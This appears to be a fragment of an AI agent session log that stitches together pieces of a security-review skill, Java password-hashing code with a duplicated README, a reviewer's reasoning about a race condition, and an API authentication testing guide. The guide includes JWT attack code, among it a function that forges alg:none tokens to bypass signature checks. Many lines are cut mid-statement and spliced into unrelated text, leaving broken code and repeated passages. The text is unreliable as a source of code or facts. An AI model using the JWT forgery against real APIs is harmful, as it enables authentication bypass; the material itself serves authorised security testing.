On its own it holds no vulnerability rules; its job is\nto understand the code under review, pull in the most relevant specialised\nskills from this same library, and apply them. This library contains hundreds\nof specialised skills (cryptographic audit, SQL injection, JWT verification,\nsecrets in source, deserialization, access control, and many more) whose\nindividual descriptions are often too narrow to self-trigger on a plain \"review\nthis code\" request. This skill is the entry point that finds and uses them.\n\n## When to Use\n\n- Any request to review, audit, or security-check source code\n- Any request to find vulnerabilities or check code against OWASP Top 10 / CWE\n- As the first step before the library's specialised application-security skills\n\n## Workflow\n\n### Step 1 - Understand the code\nRead every source file in scope. For each file, note in one or two lines what it\ndoes, and flag every security-relevant behaviour, e.g.:\n- SQL / database query construction (string building vs parameterised)\n- Cryptography: hashing, encryption, cipher mode, key/IV/salt handling, RNG\n- Authentication, sessions, password storage, tokens / JWT\n- Input handling, deserialization, file/path access, OS command execution\n- Network calls, TLS settings, secrets / credentials in source\nTurn these into a short list of keywords (e.g. \"sql injection\", \"cryptography\",\n\"jwt\", \"hardcoded secret\", \"deserialization\", \"xss\").\n\n### Step 2 - Find applicable skills (cheaply)\nThe other skills in this library are the sibling directories next to this\nskill's own directory. Do NOT read them all. Instead:\n1. Find this skill's directory, then its parent (the library root).\n2. Grep skill NAMES first for your Step 1 keywords, e.g. from the library root:\n   `ls | grep -iE 'crypto|sql|jwt|secret|deserial|xss|auth|password'`\n3. For the closest name matches, read ONLY the `description` frontmatter of\n   their SKILL.md (`sed -n '1,15p' <name>/SKILL.md`).\n\nSelect EVERY skill whose description clearly matches a security-relevant\nbehaviour you found in Step 1 - one or more per behaviour. Do NOT cap the count\nartificially: code that touches several concerns should match several skills,\nand that is expected. Order the selected skills by likely severity / relevance\nso the most important are handled first.\n\n### Step 3 - Apply each selected skill\nWork through the selected skills in priority order. Read each skill's body (and\nits `references/` files if present) only when you reach it - one at a time, not\nall up front - so that a long list of matches never exhausts context. Apply each\nskill's weakness table / checklist / verification criteria against the actual\ncode from Step 1, citing concrete `file:line` evidence for every check that\nfires. Some skills ship Python helper scripts - apply their *knowledge* to\nwhatever language the code is in; do not run their scripts against non-Python\ncode.\n\n### Step 4 - Report\nProduce a findings report:\n- One entry per issue: severity, CWE id, `file:line`, why it is a problem, and\n  the fix.\n- A \"Skills applied\" list naming the specialised skills you used.\n- For any security-relevant behaviour that had no matching library skill, review\n  it against general OWASP Top 10 / CWE knowledge and say you did so.\n- If nothing is wrong, say so explicitly and list what you checked.\n\n## Constraints\n\n- Report only. Do not create or modify any files unless explicitly asked.\n- Keep the library search cheap: grep names, skim descriptions, and fully read\n  skill bodies only as you apply them, one at a time. Never load the whole\n  library into context at once.\n\n## Verification\n\n- Every security-relevant behaviour from Step 1 is either matched to a skill and\n  checked, or explicitly reviewed against general knowledge.\n- Every finding carries a CWE id and a `file:line`.\n- The \"Skills applied\" list is Outcome(Status.INVALID_PASSWORD);\n        }\n        if (store.contains(username)) {\n            return new Outcome(Status.ACCOUNT_EXISTS);\n        }\n        String verifier = hasher.hash(password);\n        if (!store.add(username, verifier)) {\n            return new Outcome(Status.ACCOUNT_EXISTS);\n        }\n        return new Outcome(Status.OK);\n    }\n\n    /**\n     * Checks a candidate password. Every refusal is {@link Status#REJECTED} and costs one\n     * derivation: bad username shape, unusable password shape, unknown account, damaged\n     * record and wrong password all do the same amount of work.\n     */\n    public Outcome login(String rawUsername, char[] candidate) {\n        String username = Usernames.normalize(rawUsername);\n        if (username == null || !Passwords.withinLength(candidate)) {\n            hasher.burnWork();\n            return new Outcome(username == null ? Status.INVALID_USERNAME : Status.INVALID_PASSWORD);\n        }\n        if (!Passwords.isHashable(candidate)) {\n            hasher.burnWork();\n            return new Outcome(Status.REJECTED);\n        }\n        Optional<String> stored = store.verifierFor(username);\n        if (stored.isEmpty()) {\n            hasher.burnWork();\n            return new Outcome(Status.REJECTED);\n        }\n        boolean matched = hasher.verify(candidate, stored.get());\n        return new Outcome(matched ? Status.OK : Status.REJECTED);\n    }\n\n    public boolean accountExists(String rawUsername) {\n        String username = Usernames.normalize(rawUsername);\n        return username != null && store.contains(username);\n    }\n\n    public int accountCount() {\n        return store.size();\n    }\n\n    /** Verifier string as stored, for tests and for the inspect command. */\n    public Optional<String> storedVerifier(String rawUsername) {\n        String username = Usernames.normalize(rawUsername);\n        return username == null ? It is never written down. What gets\nsaved is a *one-way check value* derived from it, so somebody who steals the storage file\ncannot read the passwords out of it, and neither can this program. If you lose a password\nhere, the honest answer is \"reset it\", not \"look it up\".\n\n* Requires: JDK 11 or newer (built and tested on OpenJDK 17). No libraries, no build tool.\n* Everything lives in `src/`. Run the checks with one command, see *Running it* below.\n\n## Why the password cannot be read back\n\nStoring a password so that login still works, but so nobody can recover it, needs three\nthings. All three are here.\n\n1. **A one-way function.** The program runs the password through PBKDF2 with HMAC-SHA256\n   (a standard algorithm that ships with Java, `PBKDF2WithHmacSHA256`). PBKDF2 can be run\n   forwards as many times as you like, but there is no reverse operation. Given the output,\n   the only way to find the input is to guess and check.\n2. **A large random salt, unique per account.** Every account gets its own fresh 16 bytes\n   from `SecureRandom`. Two people who pick the same password therefore get completely\n   different stored values, so an attacker cannot hash a list of common passwords once and\n   compare them against the whole file at once (the \"rainbow table\" trick). It also means\n   you cannot tell from the file which accounts share a password.\n3. **Many repetitions.** Each check runs 310,000 rounds of hashing, which takes roughly\n   85 milliseconds on this machine. That is invisible to a real user and makes an offline\n   attack against a stolen file tens of thousands of times more expensive per guess.\n\nA note on wording: no stored password is *literally* unrecoverable, because people choose\nguessable passwords. The correct goal is what this program achieves: **the stored data holds\nno shortcut.** Recovering a password from it takes brute-force guessing at a cost you set,\nand nothing in the file makes that cheaper.\n\nThe stored line looks like this (one account, tab-separated, one line per account):\n\n```\nadalovelace<TAB>pbkdf2-sha256$310000$j6X52CBsn9ep1zFC0t+xxg==$LlOW8oCj5f/i84yn+MfsgucUrEIbPLboVvKN3WIAcQI=\n```\n\nRead left to right: the algorithm, how many rounds were used, the salt, the check value. The\nsalt and round count are stored in the clear on purpose, so the program can re-do the exact\nsame computation later; both are safe to publish. The password is not in there, in any form.\n\n## What else it does to stay honest\n\nThese are the details that tend to get missed in a password example, so they are implemented\nand each one is covered by a test.\n\n* **Logins always take the same time.** Whether you get the password wrong, name an account\n  that does not exist, or use a malformed username, the program does exactly one 85 ms\n  password derivation before answering. A login that returns instantly for unknown users and\n  slowly for known ones tells an attacker which usernames are real, without ever touching a\n  password. So refusals that never look at storage deliberately do the same work anyway,\n  against a throwaway value. Refusing a duplicate username is the one exception, and it is the\n  right way round: that answer is known before any hashing is needed, so it comes back\n  immediately, and a test asserts it does.\n* **The comparison is constant-time.** The check uses `MessageDigest.isEqual`, which\n  compares all bytes rather than bailing out at the first mismatch. Worth being precise about\n  what is proven here: that comparison takes nanoseconds underneath an ~85 ms derivation, so\n  no test can *measure* the difference. The self-test checks it structurally instead (the\n  source must call `MessageDigest.isEqual` exactly once, with no early-exit `Arrays.equals`),\n  which proves the code is written the safe way rather than measuring that it behaves that way.\n* **Some passwords are refused, on purpose.** Java's own key-derivation API quietly mangles\n  two kinds of input: it throws away trailing NUL characters, and it turns every\n  \"unpaired surrogate\" (half of an emoji) into a `?`. Both create *different passwords that\n  hash identically*, which would let one person sign in as another. They are rejected at the\n  door rather than cleaned up, because trimming them would silently change the secret. A\n  correctly-paired emoji in a password works fine, and a test proves the difference.\n* **Usernames are normalised in exactly one way.** Letters, digits and `. _ - @`, three to\n  32 characters, case-folded so `Alice` and `alice` are the same account. Only ordinary\n  spaces are trimmed. `String.trim()` is deliberately *not* used: it also deletes tabs,\n  newlines and NULs, which would quietly turn `alice` and `alice<invisible NUL>` into the\n  same account, handing out a second, invisible spelling of someone's username. Anything with\n  a control character in it is refused outright.\n* **Nothing is kept in memory longer than needed.** Passwords travel as `char[]` rather than\n  `String` (a `String` cannot be erased and lingers in the heap), and the arrays are blanked\n  after use.\n* **The file is written safely and narrowly.** Saves go to a temporary file first and are\n  then moved into place atomically, so a crash mid-save cannot leave a half-written account\n  file. On Linux the file is set to `0600` (only the owner may read it).\n* **A corrupt record can never be logged into.** If a stored line is damaged, truncated, in\n  the wrong format or from an unknown algorithm, the answer is \"no\" plus the usual 85 ms of\n  work. It never falls back to comparing anything loosely.\n\n## Files\n\n| File | What it is |\n| --- | --- |\n| `src/UserAccountApp.java` | Command line entry point (`register`, `login`, `inspect`, `selftest`). |\n| `src/UserAccountService.java` | Registration and authentication rules. |\n| `src/PasswordHasher.java` | PBKDF2 hashing, the stored format, constant-time verification. |\n| `src/AccountStore.java` | The on-disk file: load, add, atomic save, permissions. |\n| `src/Usernames.java` | Username rules and normalisation. |\n| `src/Passwords.java` | Password rules, including the unhashable-character guard. |\n| `src/SelfTest.java` | 127 checks covering all of the above. No test framework needed. |\n| `mutation-battery.sh` | Deliberately breaks each guard one at a time and demands the tests notice. |\n\n## Building and running\n\n```bash\njavac -d out src/*.java\n```\n\nRun the built-in checks first - they register accounts in a temporary directory and clean up\nafter themselves:\n\n```bash\njava -cp out SelfTest        # or: java -cp out UserAccountApp selftest\n```\n\nThen use it. The password argument is optional; leave it out to be prompted (the terminal\nwill not echo what you type, when running from a real terminal).\n\n```bash\njava -cp out UserAccountApp register AdaLovelace 'Correct Horse 9'\njava -cp out UserAccountApp inspect  adalovelace      # show what is actually stored\njava -cp out UserAccountApp login    adalovelace 'Correct Horse 9'\njava -cp out UserAccountApp login    adalovelace       # prompted for the password instead\n```\n\nBy default the accounts are kept in `accounts.txt` in the current directory. Pick another\nfile with `--store <path>` or the `ACCOUNT_STORE` environment variable. Exit status is `0`\nwhen the action succeeded and `1` when it was refused, so it composes in scripts.\n\n`inspect` is worth a look: it prints the stored salt and hash for an account and demonstrates\nthe point of the whole exercise - that is everything an attacker with the file would have, and\nthe password is not derivable from it.\n\n## How this was verified\n\nTwo levels, both run from the project root.\n\n**Behavioural.** `java -cp out SelfTest` runs 127 checks and prints\n`ALL 127 CHECKS PASSED`, exiting non-zero on any failure. Beyond the obvious\nregister-then-log-in round trip, it pins the claims made above: the raw Java crypto provider is\nshown to really collapse a password onto its trailing-NUL form *before* the guard that prevents\nit is asserted; two accounts with the same password are shown to hold different salts, digests\nand stored strings; the store file is searched for the password as plain text, base64 and hex,\nand then its *decoded* fields are searched too; every refusal shape is timed against a\nknown-wrong password (five shapes, all within 0.6x-1.8x, ~84 ms each at 60,000 rounds); a\ndeliberately damaged stored record is shown both to refuse login and to cost the same as an\nintact one.\n\n**Mutation.** `bash mutation-battery.sh` copies the sources to a scratch directory, applies 18\ntargeted defects one at a time (store the password reversibly, reuse one salt, drop the\nconstant-time comparison, skip the equalising derivation, swap in `String.trim()`, delete each\nlength and format bound, ...), rebuilds, and requires the self-test to fail. Each line names the\nassertion that caught the defect. Run against the current sources it reports\n`total mutants: 18  applied: 18  killed: 18  survived: 0  harness problems: 0`.\n\nThat number is worth reading carefully, because three of those mutants survived the *first*\nattempt and each exposed a real hole in the tests rather than a quirk of the harness:\n\n* the damaged-record timing branch is unreachable through the service, since the store rejects\n  such a line when loading, so it was only observable once timed directly against the verifier;\n* replacing the digest with a reversible encoding of the password slipped past checks that\n  searched the file's text, because the field is itself base64 - the test had to decode it first;\n* a \"lone surrogate is refused\" case was also too short to pass the length rule, so the length\n  rule was what the test had actually been checking.\n\nFixing them took the suite from 70 to 127 checks. Takeaway, if you reuse any of this: a passing\nmutation battery is evidence about your tests, and an empty-looking one tells you nothing.\n\n## Limits of this example\n\nIt is a demonstrator of safe password storage, not a production account system. Deliberately\nabsent: rate limiting and lockout after repeated failures, password reset and email\nverification, re-hashing when the round count is raised, sessions and tokens, and concurrency\nsafety (the store rewrites the whole file, so run one process at a time against it). PBKDF2 is\na sound, well-vetted choice; for a new system where you control the parameters, Argon2id or\nscrypt resist GPU and custom-hardware cracking better, and swapping one in means changing\n`PasswordHasher` and the format tag, then migrating on next login.\n"}]}},{"type":"user","uuid":"a239ffa1-0021-48bb-b2c7-65b65eb5d5d4","session_id":"f463b6b8-0275-4859-a0cb-6b9b382b1ced","parent_tool_use_id":null,"message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"call_7f417e30ac7e41a5adddf440","is_error":false,"content":"=== prompt.txt (481 bytes) ===\nDevelop a Java program that registers a new user account. One real issue: **`ensureDummyMaterial` is synchronized but `dummyPassword`/`dummySalt` are read outside the lock in `burnWork()`** → unsafe publication; another thread could see `dummySalt != null`... actually `ensureDummyMaterial()` is synchronized and completes before `derive(dummyPassword, dummySalt, iterations)` reads the fields in `burnWork()`, but the read in burnWork is NOT synchronized. Under the Java Memory Model, a thread that calls burnWork() concurrently while another initializes could read dummyPassword == null → NPE inside derive → PBEKeySpec with null password → NullPointerException → login throws instead of returning REJECTED. Also partial publication possible (non-final, non-volatile fields). That's a genuine concurrency defect (CWE-662/CWE-366 improper synchronization → race), causing an availability failure in the authentication path (login throws uncaught → stack trace / crash). Severity Low but real and not documented. Hmm, is it truly reachable? Thread A calls burnWork → ensureDummyMaterial (synchronized) initializes; Thread B calls burnWork → ensureDummyMaterial blocks until A finishes, sees dummySalt != null, returns; then B reads this.dummyPassword — no synchronization edge between A's write and B's read outside the lock? Actually there IS: B's `ensureDummyMaterial()` acquires the same monitor *after* A released it → that's a happens-before edge (unlock by A → lock by B), so writes made by A before unlock are visible to B after locking. But B reads `dummyPassword` *after* `ensureDummyMaterial()` returned, which is after B acquired and released the monitor. So happens-before is satisfied. Hmm, so it's actually safe... Let's be careful: writes by A inside synchronized block; A releases monitor. B acquires monitor (same object) → happens-before established → B's subsequent reads see A's writes. Yes, safe. Also the `if (dummySalt == null)` read inside the sync block is guarded. And a thread that never calls ensureDummyMaterial... burnWork always calls it first. So no race. Good — do NOT report. Mention in section 6 (verified: dummy material publication is protected by the monitor → safe).\n\n38. Hmm, rename() on a symlink destination replaces the symlink. Mode | ECB mode for any block cipher | High |\n| Insufficient Key Size | RSA < 2048, AES-128 for long-term | Medium |\n| Hardcoded Secrets | Keys/passwords in source code | Critical |\n| Weak KDF | Low iteration PBKDF2, plain MD5 | High |\n| Poor Entropy | time-based seeds, predictable IVs | High |\n| Deprecated Protocols | SSLv3, TLS 1.0, TLS 1.1 | High |\n\n## Security Considerations\n\n- Activates for requests involving API authentication testing, token\n  validation assessment, credential security testing, or API auth bypass.\n\n  '\ndomain: cybersecurity\nsubdomain: api-security\ntags:\n- api-security\n- owasp\n- authentication\n- jwt\n- session-management\n- credential-security\nversion: 1.0.0\nauthor: mahipal\nlicense: Apache-2.0\nnist_csf:\n- PR.PS-01\n- ID.RA-01\n- PR.DS-10\n- DE.CM-01\nmitre_attack:\n- T1190\n- T1059.007\n- T1552.001\n- T1003\n- T1110\n---\n# Testing API Authentication Weaknesses\n\n## When to Use\n\n- Assessing REST API authentication mechanisms for bypass vulnerabilities before production deployment\n- Testing JWT token implementation for common weaknesses (none algorithm, key confusion, missing expiration)\n- Evaluating whether all API endpoints enforce authentication or if some are unintentionally exposed\n- Testing API key generation, storage, and rotation mechanisms for predictability or leakage\n- Validating session management including token expiration, revocation, and refresh token security\n\n**Do not use** without written authorization. Authentication testing involves attempting to bypass security controls.\n\n## Prerequisites\n\n- Written authorization specifying target API and authentication mechanisms in scope\n- Valid test credentials for at least two user roles (regular user, admin)\n- Burp Suite Professional with JWT-related extensions (JSON Web Tokens, JWT Editor)\n- Python 3.10+ with `requests`, `PyJWT`, and `jwt` libraries\n- Wordlists for credential testing (SecLists authentication wordlists)\n- API documentation or OpenAPI specification\n\n## Workflow\n\n### Step 1: Authentication Mechanism Identification\n\n```python\nimport requests\nimport json\n\nBASE_URL = \"https://target-api.example.com/api/v1\"\n\n# Probe the API to identify authentication mechanisms\nauth_indicators = {\n    \"jwt_bearer\": False,\n    \"api_key_header\": False,\n    \"api_key_query\": False,\n    \"basic_auth\": False,\n    \"oauth2\": False,\n    \"session_cookie\": False,\n    \"custom_token\": False,\n}\n\n# Test 1: Check unauthenticated access\nresp = requests.get(f\"{BASE_URL}/users/me\")\nprint(f\"Unauthenticated: {resp.status_code}\")\nif resp.status_code == 200:\n    print(\"[CRITICAL] Endpoint accessible without authentication\")\n\n# Test 2: Check WWW-Authenticate header\nif \"WWW-Authenticate\" in resp.headers:\n    scheme = resp.headers[\"WWW-Authenticate\"]\n    print(f\"Auth scheme advertised: {scheme}\")\n    if \"Bearer\" in scheme:\n        auth_indicators[\"jwt_bearer\"] = True\n    elif \"Basic\" in scheme:\n        auth_indicators[\"basic_auth\"] = True\n\n# Test 3: Login and examine tokens\nlogin_resp = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": \"testuser@example.com\", \"password\": \"TestPass123!\"})\n\nif login_resp.status_code == 200:\n    login_data = login_resp.json()\n    # Check for JWT tokens\n    for key in [\"token\", \"access_token\", \"jwt\", \"id_token\"]:\n        if key in login_data:\n            token = login_data[key]\n            if token.count('.') == 2:\n                auth_indicators[\"jwt_bearer\"] = True\n                print(f\"JWT found in response field: {key}\")\n    # Check for refresh tokens\n    for key in [\"refresh_token\", \"refresh\"]:\n        if key in login_data:\n            print(f\"Refresh token found in field: {key}\")\n    # Check for session cookies\n    for cookie in True\n\nprint(f\"\\nAuthentication mechanisms detected: {[k for k,v in auth_indicators.items() if v]}\")\n```\n\n### Step 2: Unauthenticated Endpoint Discovery\n\n```python\n# Test all endpoints Analysis\n\n```python\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef decode_jwt_parts(token):\n    \"\"\"Decode JWT header and payload without verification.\"\"\"\n    parts = token.split('.')\n    if len(parts) != 3:\n        return None, None\n\n    def pad_base64(s):\n        return s + '=' * (4 - len(s) % 4)\n\n    header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])))\n    payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])))\n    return header, payload\n\n# Analyze the JWT token\ntoken = indent=2)}\")\n\n# Security checks\nissues = []\n\n# Check 1: Algorithm\nif header.get(\"alg\") == \"none\":\n    issues.append(\"CRITICAL: Algorithm set to 'none' - token signature not verified\")\nif header.get(\"alg\") in (\"HS256\", \"HS384\", \"HS512\"):\n    issues.append(\"INFO: Symmetric algorithm used - check for weak/default secrets\")\n\n# Check 2: Expiration\nif \"exp\" not in payload:\n    issues.append(\"HIGH: No expiration claim (exp) - token never expires\")\nelse:\n    import time\n    exp_time = payload[\"exp\"]\n    ttl = exp_time - time.time()\n    if ttl > 86400:\n        issues.append(f\"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long\")\n\n# Check 3: Sensitive data in payload\nsensitive_fields = [\"password\", \"ssn\", \"credit_card\", \"secret\", \"private_key\"]\nfor field in sensitive_fields:\n    if field in payload:\n        issues.append(f\"HIGH: Sensitive field '{field}' in JWT payload\")\n\n# Check 4: Missing claims\nexpected_claims = [\"iss\", \"aud\", \"exp\", \"iat\", \"sub\"]\nmissing = [c for c in expected_claims if c not in payload]\nif missing:\n    issues.append(f\"MEDIUM: Missing standard claims: {missing}\")\n\n# Check 5: Key ID\nif \"kid\" in header:\n    kid = header[\"kid\"]\n    # Test for path traversal in kid\n    issues.append(f\"INFO: Key ID (kid) present: {kid} - test for injection\")\n\nfor issue in issues:\n    print(f\"  [{issue.split(':')[0]}] {issue}\")\n```\n\n### Step 4: JWT Manipulation Attacks\n\n```python\n# Attack 1: Remove signature (alg: none)\ndef forge_none_algorithm(token):\n    \"\"\"Create a token with alg:none to bypass signature verification.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    header['alg'] = 'none'\n    new_header = base64.urlsafe_b64encode(\n        json.dumps(header).encode()).decode().rstrip('=')\n    # Variations of the none algorithm\n    return [\n Authentication** | OWASP API2:2023 - weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |\n| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used for stateless API authentication |\n| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |\n| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |\n| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |\n| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |\n\n## Tools & Systems\n\n- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes\n- **jwt_tool**: Python tool for JWT testing javax.crypto.spec.PBEKeySpec;\n\n/**\n * Turns a password into a stored verifier string and checks a candidate password\n * against such a string.\n *\n * <p>The stored form is {@code pbkdf2-sha256$<iterations>$<base64 salt>$<base64 digest>}.\n * It holds only a salted one-way derivation, so the password cannot be read back out of it.\n */\npublic final class PasswordHasher {\n\n    public static final String KEY_ALGORITHM = \"PBKDF2WithHmacSHA256\";\n    public static final String FORMAT_TAG = \"pbkdf2-sha256\";\n    public static final int SALT_BYTES = 16;\n    public static final int HASH_BYTES = 32;\n    public static final int DEFAULT_ITERATIONS = 310_000;\n    public static final int MIN_ITERATIONS = 1_000;\n    public static final int MAX_ITERATIONS = 5_000_000;\n\n    private static final Base64.Encoder B64 = Base64.getEncoder();\n    private static final Base64.Decoder UNB64 = Base64.getDecoder();\n\n    private final SecureRandom random = new SecureRandom();\n    private final int iterations;\n\n    /**\n     * Cost parameters used to level the response time of a failed login. Filled in\n     * lazily so that a process which never fails a login pays for one derivation only.\n     */\n    private char[] dummyPassword;\n    private byte[] dummySalt;\n\n    public PasswordHasher() {\n        this(DEFAULT_ITERATIONS);\n    }\n\n    public PasswordHasher(int iterations) {\n        if (iterations < MIN_ITERATIONS || iterations > MAX_ITERATIONS) {\n            throw new IllegalArgumentException(\n                    \"iterations must be between \" + MIN_ITERATIONS + \" and \" + MAX_ITERATIONS);\n        }\n        this.iterations = iterations;\n    }\n\n    public int iterations() {\n        return iterations;\n    }\n\n    /** Hashes {@code password} with a fresh random salt. The caller's array is left intact. */\n    public String hash(char[] password) {\n        if (password == null) {\n            throw new IllegalArgumentException(\"password is required\");\n        }\n        byte[] salt = new byte[SALT_BYTES];\n        random.nextBytes(salt);\n        byte[] digest = derive(password, salt, iterations);\n        return FORMAT_TAG + \"$\" + iterations + \"$\"\n                + B64.encodeToString(salt) + \"$\" + B64.encodeToString(digest);\n    }\n\n    /**\n     * Returns true only when {@code candidate} reproduces the digest stored in {@code encoded}.\n     *\n     * <p>A malformed or unsupported stored record is reported as a failed match, after the\n     * same amount of key derivation work as a real match attempt, so that a damaged record\n     * cannot be spotted by timing.\n     */\n    public boolean verify(char[] candidate, String encoded) {\n        StoredRecord record = tryParse(encoded);\n        if (candidate == null || record == null) {\n            burnWork();\n            return false;\n        }\n        byte[] actual = derive(candidate, record.salt(), record.iterations());\n        return MessageDigest.isEqual(actual, record.digest());\n    }\n\n    /** Performs one throwaway derivation so refusals cost what real checks cost. */\n    public void burnWork() {\n        ensureDummyMaterial();\n        derive(dummyPassword, dummySalt, iterations);\n    }\n\n    private synchronized void ensureDummyMaterial() {\n        if (dummySalt == null) {\n            dummySalt = new byte[SALT_BYTES];\n            random.nextBytes(dummySalt);\n            dummyPassword = new char[32];\n            for (int i = 0; It is never written down. What gets\nsaved is a *one-way check value* derived from it, so somebody who steals the storage file\ncannot read the passwords out of it, and neither can this program. If you lose a password\nhere, the honest answer is \"reset it\", not \"look it up\".\n\n* Requires: JDK 11 or newer (built and tested on OpenJDK 17). No libraries, no build tool.\n* Everything lives in `src/`. Run the checks with one command, see *Running it* below.\n\n## Why the password cannot be read back\n\nStoring a password so that login still works, but so nobody can recover it, needs three\nthings. All three are here.\n\n1. **A one-way function.** The program runs the password through PBKDF2 with HMAC-SHA256\n   (a standard algorithm that ships with Java, `PBKDF2WithHmacSHA256`). PBKDF2 can be run\n   forwards as many times as you like, but there is no reverse operation. Given the output,\n   the only way to find the input is to guess and check.\n2. **A large random salt, unique per account.** Every account gets its own fresh 16 bytes\n   from `SecureRandom`. Two people who pick the same password therefore get completely\n   different stored values, so an attacker cannot hash a list of common passwords once and\n   compare them against the whole file at once (the \"rainbow table\" trick). It also means\n   you cannot tell from the file which accounts share a password.\n3. **Many repetitions.** Each check runs 310,000 rounds of hashing, which takes roughly\n   85 milliseconds on this machine. That is invisible to a real user and makes an offline\n   attack against a stolen file tens of thousands of times more expensive per guess.\n\nA note on wording: no stored password is *literally* unrecoverable, because people choose\nguessable passwords. The correct goal is what this program achieves: **the stored data holds\nno shortcut.** Recovering a password from it takes brute-force guessing at a cost you set,\nand nothing in the file makes that cheaper.\n\nThe stored line looks like this (one account, tab-separated, one line per account):\n\n```\nadalovelace<TAB>pbkdf2-sha256$310000$j6X52CBsn9ep1zFC0t+xxg==$LlOW8oCj5f/i84yn+MfsgucUrEIbPLboVvKN3WIAcQI=\n```\n\nRead left to right: the algorithm, how many rounds were used, the salt, the check value. The\nsalt and round count are stored in the clear on purpose, so the program can re-do the exact\nsame computation later; both are safe to publish. The password is not in there, in any form.\n\n## What else it does to stay honest\n\nThese are the details that tend to get missed in a password example, so they are implemented\nand each one is covered by a test.\n\n* **Logins always take the same time.** Whether you get the password wrong, name an account\n  that does not exist, or use a malformed username, the program does exactly one 85 ms\n  password derivation before answering. A login that returns instantly for unknown users and\n  slowly for known ones tells an attacker which usernames are real, without ever touching a\n  password. So refusals that never look at storage deliberately do the same work anyway,\n  against a throwaway value. Refusing a duplicate username is the one exception, and it is the\n  right way round: that answer is known before any hashing is needed, so it comes back\n  immediately, and a test asserts it does.\n* **The comparison is constant-time.** The check uses `MessageDigest.isEqual`, which\n  compares all bytes rather than bailing out at the first mismatch. Worth being precise about\n  what is proven here: that comparison takes nanoseconds underneath an ~85 ms derivation, so\n  no test can *measure* the difference. The self-test checks it structurally instead (the\n  source must call `MessageDigest.isEqual` exactly once, with no early-exit `Arrays.equals`),\n  which proves the code is written the safe way rather than measuring that it behaves that way.\n* **Some passwords are refused, on purpose.** Java's own key-derivation API quietly mangles\n  two kinds of input: it throws away trailing NUL characters, and it turns every\n  \"unpaired surrogate\" (half of an emoji) into a `?`. Both create *different passwords that\n  hash identically*, which would let one person sign in as another. They are rejected at the\n  door rather than cleaned up, because trimming them would silently change the secret. A\n  correctly-paired emoji in a password works fine, and a test proves the difference.\n* **Usernames are normalised in exactly one way.** Letters, digits and `. _ - @`, three to\n  32 characters, case-folded so `Alice` and `alice` are the same account. Only ordinary\n  spaces are trimmed. `String.trim()` is deliberately *not* used: it also deletes tabs,\n  newlines and NULs, which would quietly turn `alice` and `alice<invisible NUL>` into the\n  same account, handing out a second, invisible spelling of someone's username. Anything with\n  a control character in it is refused outright.\n* **Nothing is kept in memory longer than needed.** Passwords travel as `char[]` rather than\n  `String` (a `String` cannot be erased and lingers in the heap), and the arrays are blanked\n  after use.\n* **The file is written safely and narrowly.** Saves go to a temporary file first and are\n  then moved into place atomically, so a crash mid-save cannot leave a half-written account\n  file. On Linux the file is set to `0600` (only the owner may read it).\n* **A corrupt record can never be logged into.** If a stored line is damaged, truncated, in\n  the wrong format or from an unknown algorithm, the answer is \"no\" plus the usual 85 ms of\n  work. It never falls back to comparing anything loosely.\n\n## Files\n\n| File | What it is |\n| --- | --- |\n| `src/UserAccountApp.java` | Command line entry point (`register`, `login`, `inspect`, `selftest`). |\n| `src/UserAccountService.java` | Registration and authentication rules. |\n| `src/PasswordHasher.java` | PBKDF2 hashing, the stored format, constant-time verification. |\n| `src/AccountStore.java` | The on-disk file: load, add, atomic save, permissions. |\n| `src/Usernames.java` | Username rules and normalisation. |\n| `src/Passwords.java` | Password rules, including the unhashable-character guard. |\n| `src/SelfTest.java` | 127 checks covering all of the above. No test framework needed. |\n| `mutation-battery.sh` | Deliberately breaks each guard one at a time and demands the tests notice. |\n\n## Building and running\n\n```bash\njavac -d out src/*.java\n```\n\nRun the built-in checks first - they register accounts in a temporary directory and clean up\nafter themselves:\n\n```bash\njava -cp out SelfTest        # or: java -cp out UserAccountApp selftest\n```\n\nThen use it. The password argument is optional; leave it out to be prompted (the terminal\nwill not echo what you type, when running from a real terminal).\n\n```bash\njava -cp out UserAccountApp register AdaLovelace 'Correct Horse 9'\njava -cp out UserAccountApp inspect  adalovelace      # show what is actually stored\njava -cp out UserAccountApp login    adalovelace 'Correct Horse 9'\njava -cp out UserAccountApp login    adalovelace       # prompted for the password instead\n```\n\nBy default the accounts are kept in `accounts.txt` in the current directory. Pick another\nfile with `--store <path>` or the `ACCOUNT_STORE` environment variable. Exit status is `0`\nwhen the action succeeded and `1` when it was refused, so it composes in scripts.\n\n`inspect` is worth a look: it prints the stored salt and hash for an account and demonstrates\nthe point of the whole exercise - that is everything an attacker with the file would have, and\nthe password is not derivable from it.\n\n## How this was verified\n\nTwo levels, both run from the project root.\n\n**Behavioural.** `java -cp out SelfTest` runs 127 checks and prints\n`ALL 127 CHECKS PASSED`, exiting non-zero on any failure. Beyond the obvious\nregister-then-log-in round trip, it pins the claims made above: the raw Java crypto provider is\nshown to really collapse a password onto its trailing-NUL form *before* the guard that prevents\nit is asserted; two accounts with the same password are shown to hold different salts, digests\nand stored strings; the store file is searched for the password as plain text, base64 and hex,\nand then its *decoded* fields are searched too; every refusal shape is timed against a\nknown-wrong password (five shapes, all within 0.6x-1.8x, ~84 ms each at 60,000 rounds); a\ndeliberately damaged stored record is shown both to refuse login and to cost the same as an\nintact one.\n\n**Mutation.** `bash mutation-battery.sh` copies the sources to a scratch directory, applies 18\ntargeted defects one at a time (store the password reversibly, reuse one salt, drop the\nconstant-time comparison, skip the equalising derivation, swap in `String.trim()`, delete each\nlength and format bound, ...), rebuilds, and requires the self-test to fail. Each line names the\nassertion that caught the defect. Run against the current sources it reports\n`total mutants: 18  applied: 18  killed: 18  survived: 0  harness problems: 0`.\n\nThat number is worth reading carefully, because three of those mutants survived the *first*\nattempt and each 